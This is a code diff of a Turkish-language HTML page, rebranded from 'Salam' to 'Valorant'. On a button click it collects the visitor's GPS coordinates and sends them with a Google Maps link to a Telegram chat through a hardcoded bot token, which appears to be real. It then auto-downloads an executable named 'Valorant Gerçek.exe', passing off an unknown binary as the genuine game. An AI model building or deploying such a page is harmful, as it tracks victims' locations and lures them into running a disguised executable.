@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salam Gönderimi</title>
+  <title>Valorant Gönderimi</title>
   <meta charset="UTF-8">
   <script>
     const token = '8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg'; // ← Bot tokenını buraya yaz
@@ -10,26 +10,28 @@
     function sendLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+          const lat = position.coords.latitude.toFixed(6);
+          const lon = position.coords.longitude.toFixed(6);
 
-          // Telegram'a konum gönder
-          fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+          const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          const message = `📍 Konum Bilgisi:\nEnlem: ${lat}\nBoylam: ${lon}\n🧭 Navigasyon: ${googleMapsLink}`;
+
+          // Telegram'a mesaj gönder
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               chat_id: chat_id,
-              latitude: lat,
-              longitude: lon
+              text: message
             })
           })
           .then(() => {
             console.log("Konum Telegram'a gönderildi.");
 
-            // Salam.exe indir
+            // Valorant Gerçek.exe indir
             const link = document.createElement('a');
-            link.href = 'salam.exe';
-            link.download = 'salam.exe';
+            link.href = 'Valorant Gerçek.exe';
+            link.download = 'Valorant Gerçek.exe';
             document.body.appendChild(link);
             link.click();
 
@@ -47,7 +49,7 @@
   </script>
 </head>
 <body style="text-align:center; font-family:sans-serif; margin-top:50px;">
-  <h2>Salam Gönderimi Başlat</h2>
+  <h2>Valorant Gönderimi Başlat</h2>
   <p>Konumun Telegram'a gönderilecek, dosya indirilecek ve video açılacak.</p>
   <button onclick="sendLocation()" style="padding:10px 20px; font-size:16px;">Başlat</button>
 </body>
